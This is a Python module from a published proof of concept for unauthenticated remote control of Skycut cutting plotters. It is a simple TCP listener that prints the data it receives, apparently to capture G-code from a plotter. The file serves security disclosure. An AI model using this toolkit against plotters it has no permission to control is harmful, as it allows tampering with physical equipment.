# Module: gcode-enumeration-server.py
# Part of the Skycut V Series Cutting Plotter Unauthenticated Remote Control
# Author: Omar Elshopky (omarelshopky.com)
#
# Full Write-up: https://medium.com/@omarelshopky/wireless-weapons-turning-skycut-plotters-into-physical-dangers-9f29e0cd357a
# Advisory: https://github.com/omarelshopky/skycut-v-series-cutting-plotter-unauth-remote-control-poc

import socket

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 8080

def start_server(host, port):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)

    print(f"Server listening on {host}:{port}")

    while True:
        client_socket, client_address = server_socket.accept()
        print(f"Connection from {client_address}")

        data = client_socket.recv(1024)
        while data:
            print(f"Received data: {data.decode('utf-8')}")
            data = client_socket.recv(1024)

        print("Connection closed")
        client_socket.close()

if __name__ == "__main__":
    start_server(SERVER_HOST, SERVER_PORT)